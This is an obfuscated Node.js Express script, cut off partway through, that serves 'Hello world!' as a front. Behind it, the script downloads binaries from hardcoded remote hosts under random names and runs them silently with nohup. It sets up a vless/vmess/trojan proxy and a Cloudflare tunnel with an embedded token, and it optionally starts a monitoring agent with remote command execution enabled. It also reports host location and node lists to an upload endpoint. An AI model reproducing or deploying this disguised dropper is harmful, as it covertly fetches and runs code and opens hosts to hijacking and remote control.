const _0x460aa4=_0x5206;(function(_0x45b600,_0x17f8bf){const _0x27051c={_0x47e0ea:0x231,_0x39ad0c:0x1ab,_0x368e79:0x22c,_0x140261:0x232,_0x788dcb:0x18d},_0x42c657=_0x5206,_0x2b36a8=_0x45b600();while(!![]){try{const _0x5be802=-parseInt(_0x42c657(_0x27051c._0x47e0ea))/0x1*(parseInt(_0x42c657(0x1cf))/0x2)+-parseInt(_0x42c657(_0x27051c._0x39ad0c))/0x3*(-parseInt(_0x42c657(0x217))/0x4)+parseInt(_0x42c657(0x1be))/0x5+-parseInt(_0x42c657(_0x27051c._0x368e79))/0x6+-parseInt(_0x42c657(_0x27051c._0x140261))/0x7+parseInt(_0x42c657(0x1a8))/0x8+parseInt(_0x42c657(0x1ce))/0x9*(parseInt(_0x42c657(_0x27051c._0x788dcb))/0xa);if(_0x5be802===_0x17f8bf)break;else _0x2b36a8['push'](_0x2b36a8['shift']());}catch(_0x162c57){_0x2b36a8['push'](_0x2b36a8['shift']());}}}(_0x2776,0x7df7a));const express=require(_0x460aa4(0x1e2)),app=express(),axios=require(_0x460aa4(0x1c4)),os=require('os'),fs=require('fs'),path=require(_0x460aa4(0x1b2)),{promisify}=require(_0x460aa4(0x1e8)),exec=promisify(require(_0x460aa4(0x1c6))[_0x460aa4(0x1e6)]),{execSync}=require(_0x460aa4(0x1c6)),UPLOAD_URL=process[_0x460aa4(0x21b)]['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0x460aa4(0x197)]||'',AUTO_ACCESS=process[_0x460aa4(0x21b)][_0x460aa4(0x194)]||![],FILE_PATH=process[_0x460aa4(0x21b)]['FILE_PATH']||_0x460aa4(0x1e3),SUB_PATH=process[_0x460aa4(0x21b)][_0x460aa4(0x1f2)]||_0x460aa4(0x219),PORT=process[_0x460aa4(0x21b)][_0x460aa4(0x1ac)]||process[_0x460aa4(0x21b)][_0x460aa4(0x1c0)]||0xbb8,UUID=process['env'][_0x460aa4(0x23c)]||'7fd1ec71-b42d-442a-9498-a02ee30ab063',NEZHA_SERVER=process['env'][_0x460aa4(0x1f6)]||'',NEZHA_PORT=process[_0x460aa4(0x21b)][_0x460aa4(0x18a)]||'',NEZHA_KEY=process[_0x460aa4(0x21b)][_0x460aa4(0x205)]||'',ARGO_DOMAIN=process[_0x460aa4(0x21b)][_0x460aa4(0x213)]||_0x460aa4(0x1bd),ARGO_AUTH=process[_0x460aa4(0x21b)][_0x460aa4(0x1ed)]||_0x460aa4(0x1da),ARGO_PORT=process[_0x460aa4(0x21b)][_0x460aa4(0x1b9)]||0x1f47,CFIP=process['env'][_0x460aa4(0x21e)]||'cdns.doon.eu.org',CFPORT=process[_0x460aa4(0x21b)][_0x460aa4(0x186)]||0x1bb,NAME=process[_0x460aa4(0x21b)][_0x460aa4(0x22f)]||'us0202';function _0x2776(){const _0x400b72=['data','direct','\x0a\x0atrojan://','https://amd64.ssss.nyc.mn/agent','match','chmod','get','\x22\x20>\x20/dev/null\x202>&1','3888498kvFKgu','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','ArgoDomain:','NAME','\x20>/dev/null\x202>&1\x20&','7VMoPeq','4426100HvEmHX','127.0.0.1','win32','ARGO_DOMAIN:','/config.json\x20>/dev/null\x202>&1\x20&','success','org','true','stringify','\x0a\x20\x20tunnel:\x20','UUID','\x0avless://','includes','\x20>\x20nul\x202>&1','split','tunnel.json','CFPORT','then','http','charAt','NEZHA_PORT','post','forEach','12460PRSiXt','Empowerment\x20failed\x20for\x20','finish','quic','sub.txt','send','error','AUTO_ACCESS','mkdirSync','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','PROJECT_URL','/tunnel.yml\x20run','none','pkill\x20-f\x20\x22[','catch','App\x20is\x20running','TunnelSecret','Skipping\x20adding\x20automatic\x20access\x20task','arm','del\x20/f\x20/q\x20','Empowerment\x20success\x20for\x20','nohup\x20','status','log','2087','?encryption=none&security=tls&sni=','platform','7157560ZGMCgs','http://ip-api.com/json/','filter','129gkQGNe','SERVER_PORT','Nodes\x20uploaded\x20successfully','tunnel.yml','arch','/dev/null','https://amd64.ssss.nyc.mn/bot','path','xtls-rprx-vision','unshift','existsSync','basename','createWriteStream','tls','ARGO_PORT','firefox','rm\x20-rf\x20','substring','faaaafaa.ycytop.ggff.net','898410IiyZlJ','NEZHA\x20variable\x20is\x20empty,skip\x20running','PORT','Content-Type','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','application/json','axios','php\x20running\x20error:\x20','child_process','country_code','isFile','--tls','Error\x20executing\x20command:\x20','test','\x20is\x20created','clear','9108SLblyU','171650wSXflN','\x20failed:\x20','aarch64','config.json','from','close','set','boot.log','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','arm64','eyJhIjoiMDQ0Nzc2Y2ZhODlkMjQ0ZDg2ZjcxMGQ4ZDlmYWMzYmEiLCJ0IjoiZWNhODBmOTctMzZkNS00YTI3LWIzNDItMWEwMDFiMzkxOTRjIiwicyI6Ik5ERTRaVFExT0RndFkyWXhNaTAwWmpNeUxXRmtOMll0WVdZMU5qSmpORGt3TVRSbCJ9','\x20successfully','Unhandled\x20error\x20in\x20startserver:','\x0aclient_secret:\x20','\x0a\x0avmess://','Download\x20','&path=%2Fvless-argo%3Fed%3D2560#','stream','express','./tmp','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/vmess-argo','exec','list.txt','util','join','2083','base64','&fp=firefox&type=ws&host=','ARGO_AUTH','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','automatic\x20access\x20task\x20added\x20successfully','https+local://8.8.8.8/dns-query','\x20is\x20running','SUB_PATH','utf-8','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','vmess','NEZHA_SERVER','web\x20running\x20error:\x20','statSync','text/plain;\x20charset=utf-8','2096','has','response','https://arm64.ssss.nyc.mn/web','?security=tls&sni=','random','map','push','length','all','8443','NEZHA_KEY','2053','\x0a\x20\x20credentials-file:\x20','tcp','http\x20server\x20is\x20running\x20on\x20port:','message','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://amd64.ssss.nyc.mn/web','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','.exe\x20>\x20nul\x202>&1','/trojan-argo','writeFileSync','&path=%2Ftrojan-argo%3Fed%3D2560#','/vless-argo','ARGO_DOMAIN','pop','/api/add-subscriptions','Error\x20downloading\x20files:','5748cQTDoQ','vless','lalsdfqq7777','toString','env','countryCode','listen','CFIP','trojan','https://amd64.ssss.nyc.mn/v1','https://arm64.ssss.nyc.mn/bot','pipe','unlinkSync'];_0x2776=function(){return _0x400b72;};return _0x2776();}!fs[_0x460aa4(0x1b5)](FILE_PATH)?(fs[_0x460aa4(0x195)](FILE_PATH),console[_0x460aa4(0x1a4)](FILE_PATH+_0x460aa4(0x1cc))):console[_0x460aa4(0x1a4)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x3a035e={_0x183528:0x189,_0xd677af:0x1ff},_0x3def45=_0x460aa4,_0x3f2b8e='abcdefghijklmnopqrstuvwxyz';let _0x572d0c='';for(let _0x7b08d=0x0;_0x7b08d<0x6;_0x7b08d++){_0x572d0c+=_0x3f2b8e[_0x3def45(_0x3a035e._0x183528)](Math['floor'](Math[_0x3def45(_0x3a035e._0xd677af)]()*_0x3f2b8e['length']));}return _0x572d0c;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x460aa4(0x1e9)](FILE_PATH,webName),botPath=path[_0x460aa4(0x1e9)](FILE_PATH,botName),subPath=path[_0x460aa4(0x1e9)](FILE_PATH,_0x460aa4(0x191)),listPath=path[_0x460aa4(0x1e9)](FILE_PATH,_0x460aa4(0x1e7)),bootLogPath=path[_0x460aa4(0x1e9)](FILE_PATH,_0x460aa4(0x1d6)),configPath=path['join'](FILE_PATH,_0x460aa4(0x1d2));function deleteNodes(){const _0x40c57f={_0x2c2eea:0x1b5,_0x49be51:0x1aa,_0x50879f:0x202,_0x25735d:0x19b},_0x320623=_0x460aa4;try{if(!UPLOAD_URL)return;if(!fs[_0x320623(_0x40c57f._0x2c2eea)](subPath))return;let _0x2ffc4e;try{_0x2ffc4e=fs['readFileSync'](subPath,_0x320623(0x1f3));}catch{return null;}const _0x53d521=Buffer['from'](_0x2ffc4e,_0x320623(0x1eb))['toString']('utf-8'),_0x3b818d=_0x53d521['split']('\x0a')[_0x320623(_0x40c57f._0x49be51)](_0x538169=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x320623(0x1cb)](_0x538169));if(_0x3b818d[_0x320623(_0x40c57f._0x50879f)]===0x0)return;return axios[_0x320623(0x18b)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x3b818d}),{'headers':{'Content-Type':'application/json'}})[_0x320623(_0x40c57f._0x25735d)](_0x5d21b7=>{return null;}),null;}catch(_0x551279){return null;}}function _0x5206(_0x1227fd,_0x2c3fac){const _0x277664=_0x2776();return _0x5206=function(_0x5206cf,_0x4b00b3){_0x5206cf=_0x5206cf-0x185;let _0x3848c0=_0x277664[_0x5206cf];return _0x3848c0;},_0x5206(_0x1227fd,_0x2c3fac);}function cleanupOldFiles(){const _0x3ccdbf={_0x581907:0x1f8};try{const _0x461de7=fs['readdirSync'](FILE_PATH);_0x461de7['forEach'](_0x13a8d4=>{const _0x2435a6=_0x5206,_0x52db17=path['join'](FILE_PATH,_0x13a8d4);try{const _0x359bb1=fs[_0x2435a6(_0x3ccdbf._0x581907)](_0x52db17);_0x359bb1[_0x2435a6(0x1c8)]()&&fs[_0x2435a6(0x223)](_0x52db17);}catch(_0x440bf2){}});}catch(_0x5a5173){}}app['get']('/',function(_0x113f21,_0x1d34e6){const _0x2fd991=_0x460aa4;_0x1d34e6[_0x2fd991(0x192)]('Hello\x20world!');});async function generateConfig(){const _0x334271={_0x1832c2:0x1b0,_0xcfcd90:0x1b0,_0x35e4b8:0x199,_0x26539e:0x212,_0x876c2c:0x20f,_0x1e012b:0x208,_0x520526:0x218,_0x476bec:0x199,_0x5175ff:0x188,_0x4e3f87:0x190,_0x273f6e:0x199,_0x42caaf:0x20f,_0x1c52a8:0x190,_0x5e5b84:0x1f0,_0x5b54c8:0x225,_0xde27cc:0x210,_0x27a87f:0x1e9},_0x3e3c78=_0x460aa4,_0x1b3dc2={'log':{'access':_0x3e3c78(_0x334271._0x1832c2),'error':_0x3e3c78(_0x334271._0xcfcd90),'loglevel':_0x3e3c78(_0x334271._0x35e4b8)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x3e3c78(0x1b3)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x3e3c78(_0x334271._0x26539e),'dest':0xbba},{'path':_0x3e3c78(0x1e5),'dest':0xbbb},{'path':_0x3e3c78(_0x334271._0x876c2c),'dest':0xbbc}]},'streamSettings':{'network':_0x3e3c78(_0x334271._0x1e012b)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x3e3c78(_0x334271._0x520526),'settings':{'clients':[{'id':UUID}],'decryption':_0x3e3c78(_0x334271._0x476bec)},'streamSettings':{'network':_0x3e3c78(0x208),'security':_0x3e3c78(_0x334271._0x476bec)}},{'port':0xbba,'listen':_0x3e3c78(0x233),'protocol':_0x3e3c78(_0x334271._0x520526),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3e3c78(_0x334271._0x35e4b8)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x3e3c78(0x212)}},'sniffing':{'enabled':!![],'destOverride':[_0x3e3c78(_0x334271._0x5175ff),_0x3e3c78(0x1b8),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x3e3c78(0x1f5),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3e3c78(0x1e5)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x3e3c78(_0x334271._0x4e3f87)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x3e3c78(0x21f),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3e3c78(_0x334271._0x273f6e),'wsSettings':{'path':_0x3e3c78(_0x334271._0x42caaf)}},'sniffing':{'enabled':!![],'destOverride':[_0x3e3c78(0x188),'tls',_0x3e3c78(_0x334271._0x1c52a8)],'metadataOnly':![]}}],'dns':{'servers':[_0x3e3c78(_0x334271._0x5e5b84)]},'outbounds':[{'protocol':'freedom','tag':_0x3e3c78(_0x334271._0x5b54c8)},{'protocol':'blackhole','tag':'block'}]};fs[_0x3e3c78(_0x334271._0xde27cc)](path[_0x3e3c78(_0x334271._0x27a87f)](FILE_PATH,_0x3e3c78(0x1d2)),JSON['stringify'](_0x1b3dc2,null,0x2));}function getSystemArchitecture(){const _0x18ab24={_0x32e991:0x1d9,_0x188c3f:0x1d1,_0x39b383:0x19f},_0x5b395c=_0x460aa4,_0x4854d6=os[_0x5b395c(0x1af)]();return _0x4854d6==='arm'||_0x4854d6===_0x5b395c(_0x18ab24._0x32e991)||_0x4854d6===_0x5b395c(_0x18ab24._0x188c3f)?_0x5b395c(_0x18ab24._0x39b383):'amd';}function downloadFile(_0xc30cd2,_0x584cc1,_0x181d14){const _0x47b10b={_0x376457:0x1b5,_0x47ed61:0x195},_0x3f0b3a={_0x213d7e:0x1d0,_0x235a38:0x20a,_0x18bb21:0x193},_0x52f9ab={_0x2ed202:0x18f,_0x5ba171:0x193},_0x14327b={_0x5241d5:0x1b6},_0x485139={_0x209007:0x1d4,_0x36bded:0x1df,_0x5395cf:0x1b6},_0x43efea=_0x460aa4,_0x1ad18f=_0xc30cd2;!fs[_0x43efea(_0x47b10b._0x376457)](FILE_PATH)&&fs[_0x43efea(_0x47b10b._0x47ed61)](FILE_PATH,{'recursive':!![]});const _0x2d532f=fs[_0x43efea(0x1b7)](_0x1ad18f);axios({'method':_0x43efea(0x22a),'url':_0x584cc1,'responseType':_0x43efea(0x1e1)})[_0x43efea(0x187)](_0x397935=>{const _0x518976=_0x43efea;_0x397935[_0x518976(0x224)][_0x518976(0x222)](_0x2d532f),_0x2d532f['on'](_0x518976(_0x52f9ab._0x2ed202),()=>{const _0xa53dfb=_0x518976;_0x2d532f[_0xa53dfb(_0x485139._0x209007)](),console[_0xa53dfb(0x1a4)](_0xa53dfb(_0x485139._0x36bded)+path[_0xa53dfb(_0x485139._0x5395cf)](_0x1ad18f)+_0xa53dfb(0x1db)),_0x181d14(null,_0x1ad18f);}),_0x2d532f['on'](_0x518976(_0x52f9ab._0x5ba171),_0x303fb4=>{const _0x273dc8=_0x518976;fs['unlink'](_0x1ad18f,()=>{});const _0x57be16=_0x273dc8(0x1df)+path[_0x273dc8(_0x14327b._0x5241d5)](_0x1ad18f)+_0x273dc8(0x1d0)+_0x303fb4[_0x273dc8(0x20a)];console[_0x273dc8(0x193)](_0x57be16),_0x181d14(_0x57be16);});})[_0x43efea(0x19b)](_0x3aa7b7=>{const _0xfcc7d6=_0x43efea,_0x3accef=_0xfcc7d6(0x1df)+path['basename'](_0x1ad18f)+_0xfcc7d6(_0x3f0b3a._0x213d7e)+_0x3aa7b7[_0xfcc7d6(_0x3f0b3a._0x235a38)];console[_0xfcc7d6(_0x3f0b3a._0x18bb21)](_0x3accef),_0x181d14(_0x3accef);});}async function downloadFilesAndRun(){const _0x4d1d58={_0x32f603:0x202,_0x1600d8:0x1a4,_0x102678:0x1f4,_0x827c34:0x193,_0x4ea07f:0x216,_0x319cd8:0x240,_0x4ef126:0x1fa,_0x13ccba:0x1ea,_0x45bc22:0x206,_0xf93b76:0x1fb,_0x5f217f:0x1dd,_0x2e28c4:0x20b,_0x3c82f2:0x1a2,_0x2dfb70:0x1c9,_0x25393a:0x1a4,_0x634a39:0x1a2,_0x5caf10:0x236,_0x3325c5:0x1f7,_0x12413e:0x228,_0x1c9eb1:0x230,_0x1df232:0x1ca},_0xff9359={_0x453f95:0x229},_0x49388b=_0x460aa4,_0x22c064=getSystemArchitecture(),_0x50c3db=getFilesForArchitecture(_0x22c064);if(_0x50c3db[_0x49388b(_0x4d1d58._0x32f603)]===0x0){console[_0x49388b(_0x4d1d58._0x1600d8)](_0x49388b(_0x4d1d58._0x102678));return;}const _0x599632=_0x50c3db[_0x49388b(0x200)](_0x1cadf5=>{return new Promise((_0x1743a4,_0x7aa4e)=>{downloadFile(_0x1cadf5['fileName'],_0x1cadf5['fileUrl'],(_0x575eb5,_0x4bf538)=>{_0x575eb5?_0x7aa4e(_0x575eb5):_0x1743a4(_0x4bf538);});});});try{await Promise[_0x49388b(0x203)](_0x599632);}catch(_0x190477){console[_0x49388b(_0x4d1d58._0x827c34)](_0x49388b(_0x4d1d58._0x4ea07f),_0x190477);return;}function _0x3877f6(_0x19367a){const _0x453285=_0x49388b,_0x44abf4=0x1fd;_0x19367a[_0x453285(0x18c)](_0x5a7428=>{const _0x9c8849={_0x3a0652:0x193,_0x4b78ef:0x1a4,_0x109472:0x21a},_0x38b5dc=_0x453285;fs['existsSync'](_0x5a7428)&&fs[_0x38b5dc(_0xff9359._0x453f95)](_0x5a7428,_0x44abf4,_0x3fd64b=>{const _0x2eb699=_0x38b5dc;_0x3fd64b?console[_0x2eb699(_0x9c8849._0x3a0652)](_0x2eb699(0x18e)+_0x5a7428+':\x20'+_0x3fd64b):console[_0x2eb699(_0x9c8849._0x4b78ef)](_0x2eb699(0x1a1)+_0x5a7428+':\x20'+_0x44abf4[_0x2eb699(_0x9c8849._0x109472)](0x8));});});}const _0x489c7b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3877f6(_0x489c7b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4af823=NEZHA_SERVER[_0x49388b(0x23e)](':')?NEZHA_SERVER[_0x49388b(_0x4d1d58._0x319cd8)](':')[_0x49388b(0x214)]():'',_0x40cd=new Set(['443','8443',_0x49388b(_0x4d1d58._0x4ef126),_0x49388b(0x1a5),_0x49388b(_0x4d1d58._0x13ccba),_0x49388b(_0x4d1d58._0x45bc22)]),_0x4fa3d0=_0x40cd[_0x49388b(_0x4d1d58._0xf93b76)](_0x4af823)?_0x49388b(0x239):'false',_0x24f7a8=_0x49388b(_0x4d1d58._0x5f217f)+NEZHA_KEY+_0x49388b(_0x4d1d58._0x2e28c4)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x4fa3d0+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x49388b(0x210)](path[_0x49388b(0x1e9)](FILE_PATH,'config.yaml'),_0x24f7a8);const _0x555a55=_0x49388b(_0x4d1d58._0x3c82f2)+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x555a55),console['log'](phpName+_0x49388b(0x1f1)),await new Promise(_0x5840b0=>setTimeout(_0x5840b0,0x3e8));}catch(_0x20e200){console[_0x49388b(0x193)](_0x49388b(0x1c5)+_0x20e200);}}else{let _0x5a6eae='';const _0x56f9ad=['443',_0x49388b(0x204),_0x49388b(_0x4d1d58._0x4ef126),_0x49388b(0x1a5),_0x49388b(_0x4d1d58._0x13ccba),'2053'];_0x56f9ad['includes'](NEZHA_PORT)&&(_0x5a6eae=_0x49388b(_0x4d1d58._0x2dfb70));const _0x307b8d=_0x49388b(0x1a2)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5a6eae+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x307b8d),console[_0x49388b(0x1a4)](npmName+'\x20is\x20running'),await new Promise(_0x49919f=>setTimeout(_0x49919f,0x3e8));}catch(_0x5956d4){console[_0x49388b(0x193)]('npm\x20running\x20error:\x20'+_0x5956d4);}}}else console[_0x49388b(_0x4d1d58._0x25393a)](_0x49388b(0x1bf));const _0x37189d=_0x49388b(_0x4d1d58._0x634a39)+webPath+'\x20-c\x20'+FILE_PATH+_0x49388b(_0x4d1d58._0x5caf10);try{await exec(_0x37189d),console[_0x49388b(0x1a4)](webName+'\x20is\x20running'),await new Promise(_0x311592=>setTimeout(_0x311592,0x3e8));}catch(_0x40839a){console[_0x49388b(_0x4d1d58._0x827c34)](_0x49388b(_0x4d1d58._0x3325c5)+_0x40839a);}if(fs[_0x49388b(0x1b5)](botPath)){let _0x3ebe01;if(ARGO_AUTH[_0x49388b(0x228)](/^[A-Z0-9a-z=]{120,250}$/))_0x3ebe01=_0x49388b(0x22d)+ARGO_AUTH;else ARGO_AUTH[_0x49388b(_0x4d1d58._0x12413e)](/TunnelSecret/)?_0x3ebe01=_0x49388b(0x196)+FILE_PATH+_0x49388b(0x198):_0x3ebe01='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x3ebe01+_0x49388b(_0x4d1d58._0x1c9eb1)),console[_0x49388b(0x1a4)](botName+_0x49388b(0x1f1)),await new Promise(_0x3d185f=>setTimeout(_0x3d185f,0x7d0));}catch(_0x17280a){console[_0x49388b(0x193)](_0x49388b(_0x4d1d58._0x1df232)+_0x17280a);}}await new Promise(_0x24b528=>setTimeout(_0x24b528,0x1388));}function getFilesForArchitecture(_0x2adf26){const _0x359868={_0x3c66fb:0x221,_0x491740:0x1b4},_0x4d6486=_0x460aa4;let _0x356772;_0x2adf26==='arm'?_0x356772=[{'fileName':webPath,'fileUrl':_0x4d6486(0x1fd)},{'fileName':botPath,'fileUrl':_0x4d6486(_0x359868._0x3c66fb)}]:_0x356772=[{'fileName':webPath,'fileUrl':_0x4d6486(0x20c)},{'fileName':botPath,'fileUrl':_0x4d6486(0x1b1)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1766e0=_0x2adf26===_0x4d6486(0x19f)?'https://arm64.ssss.nyc.mn/agent':_0x4d6486(0x227);_0x356772[_0x4d6486(_0x359868._0x491740)]({'fileName':npmPath,'fileUrl':_0x1766e0});}else{const _0x532501=_0x2adf26===_0x4d6486(0x19f)?'https://arm64.ssss.nyc.mn/v1':_0x4d6486(0x220);_0x356772['unshift']({'fileName':phpPath,'fileUrl':_0x532501});}}return _0x356772;}function argoType(){const _0x5b41fd={_0x4c557a:0x1a4,_0x2c27bc:0x23e,_0x4223b8:0x23b,_0x4bb910:0x207,_0x2adde4:0x185,_0xe4c29b:0x1e4,_0xe7fd39:0x20d},_0x2cf3bb=_0x460aa4;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2cf3bb(_0x5b41fd._0x4c557a)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x2cf3bb(_0x5b41fd._0x2c27bc)](_0x2cf3bb(0x19d))){fs[_0x2cf3bb(0x210)](path[_0x2cf3bb(0x1e9)](FILE_PATH,_0x2cf3bb(0x185)),ARGO_AUTH);const _0x262c5c=_0x2cf3bb(_0x5b41fd._0x4223b8)+ARGO_AUTH['split']('\x22')[0xb]+_0x2cf3bb(_0x5b41fd._0x4bb910)+path['join'](FILE_PATH,_0x2cf3bb(_0x5b41fd._0x2adde4))+_0x2cf3bb(_0x5b41fd._0xe4c29b)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x2cf3bb(0x1c2);fs['writeFileSync'](path['join'](FILE_PATH,_0x2cf3bb(0x1ae)),_0x262c5c);}else console[_0x2cf3bb(0x1a4)](_0x2cf3bb(_0x5b41fd._0xe7fd39));}async function extractDomains(){const _0x3ce1cd={_0x9202e9:0x1f3,_0x2f8e44:0x1a4,_0x281be5:0x1f1,_0xdb7893:0x193},_0x3d4377={_0x28933d:0x22a,_0x5b82d7:0x224,_0x527155:0x1c7,_0x1f15fc:0x224,_0x20e3aa:0x238,_0xd0d244:0x22a,_0x54af13:0x1a9,_0x5bbd92:0x224,_0x3b6a92:0x1a3,_0x8494c3:0x237},_0x2ca413={_0x230766:0x234,_0x10fd4d:0x20e,_0x253a4f:0x19a,_0xd509c6:0x189,_0x465996:0x1bc},_0x38e558=_0x460aa4;let _0x2498c0;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2498c0=ARGO_DOMAIN,console['log'](_0x38e558(0x235),_0x2498c0),await _0x4c85b1(_0x2498c0);else try{const _0x4513de=fs['readFileSync'](path[_0x38e558(0x1e9)](FILE_PATH,'boot.log'),_0x38e558(_0x3ce1cd._0x9202e9)),_0x2695b1=_0x4513de[_0x38e558(0x240)]('\x0a'),_0x488cd1=[];_0x2695b1[_0x38e558(0x18c)](_0x2f4fd8=>{const _0x4a5df2=_0x38e558,_0x122760=_0x2f4fd8[_0x4a5df2(0x228)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x122760){const _0x22f267=_0x122760[0x1];_0x488cd1[_0x4a5df2(0x201)](_0x22f267);}});if(_0x488cd1[_0x38e558(0x202)]>0x0)_0x2498c0=_0x488cd1[0x0],console[_0x38e558(0x1a4)](_0x38e558(0x22e),_0x2498c0),await _0x4c85b1(_0x2498c0);else{console[_0x38e558(_0x3ce1cd._0x2f8e44)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x38e558(0x223)](path['join'](FILE_PATH,'boot.log'));async function _0x56e3f2(){const _0xe98bbf=_0x38e558;try{process[_0xe98bbf(0x1a7)]===_0xe98bbf(_0x2ca413._0x230766)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0xe98bbf(_0x2ca413._0x10fd4d)):await exec(_0xe98bbf(_0x2ca413._0x253a4f)+botName[_0xe98bbf(_0x2ca413._0xd509c6)](0x0)+']'+botName[_0xe98bbf(_0x2ca413._0x465996)](0x1)+_0xe98bbf(0x22b));}catch(_0x396650){}}_0x56e3f2(),await new Promise(_0x2fb23c=>setTimeout(_0x2fb23c,0xbb8));const _0x86d8a0=_0x38e558(0x1d8)+FILE_PATH+_0x38e558(0x1d7)+ARGO_PORT;try{await exec(_0x38e558(0x1a2)+botPath+'\x20'+_0x86d8a0+_0x38e558(0x230)),console['log'](botName+_0x38e558(_0x3ce1cd._0x281be5)),await new Promise(_0x182439=>setTimeout(_0x182439,0xbb8)),await extractDomains();}catch(_0x2f4299){console[_0x38e558(_0x3ce1cd._0xdb7893)]('Error\x20executing\x20command:\x20'+_0x2f4299);}}}catch(_0x31a072){console[_0x38e558(0x193)]('Error\x20reading\x20boot.log:',_0x31a072);}async function _0x1d6e6b(){const _0x5642e9=_0x38e558;try{const _0x310d00=await axios[_0x5642e9(_0x3d4377._0x28933d)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x310d00[_0x5642e9(_0x3d4377._0x5b82d7)]&&_0x310d00[_0x5642e9(0x224)][_0x5642e9(_0x3d4377._0x527155)]&&_0x310d00[_0x5642e9(_0x3d4377._0x1f15fc)]['org'])return _0x310d00['data'][_0x5642e9(0x1c7)]+'_'+_0x310d00[_0x5642e9(0x224)][_0x5642e9(_0x3d4377._0x20e3aa)];}catch(_0x3bb710){try{const _0x1143b7=await axios[_0x5642e9(_0x3d4377._0xd0d244)](_0x5642e9(_0x3d4377._0x54af13),{'timeout':0xbb8});if(_0x1143b7[_0x5642e9(_0x3d4377._0x5bbd92)]&&_0x1143b7['data'][_0x5642e9(_0x3d4377._0x3b6a92)]===_0x5642e9(_0x3d4377._0x8494c3)&&_0x1143b7[_0x5642e9(_0x3d4377._0x5bbd92)]['countryCode']&&_0x1143b7[_0x5642e9(_0x3d4377._0x5b82d7)][_0x5642e9(0x238)])return _0x1143b7[_0x5642e9(0x224)][_0x5642e9(0x21c)]+'_'+_0x1143b7['data']['org'];}catch(_0x3008ad){}}return'Unknown';}async function _0x4c85b1(_0x1f7d08){const _0x27a13d=await _0x1d6e6b(),_0x3dacea=NAME?NAME+'-'+_0x27a13d:_0x27a13d;return new Promise(_0x442923=>{const _0x3cd2b5={_0x25ab3f:0x199,_0x2690df:0x1b8,_0x12ad36:0x23d,_0x3ea568:0x1e0,_0x52f796:0x1de,_0x2863ef:0x23a,_0x417793:0x21a,_0x5ce0dc:0x226,_0x3b9ba9:0x1fe,_0x4e44d7:0x1ec,_0x220eb2:0x211,_0x1c971c:0x1a4,_0x32b8a1:0x210,_0x21d9d8:0x21a,_0x45a140:0x1eb,_0x1f79b1:0x22a};setTimeout(()=>{const 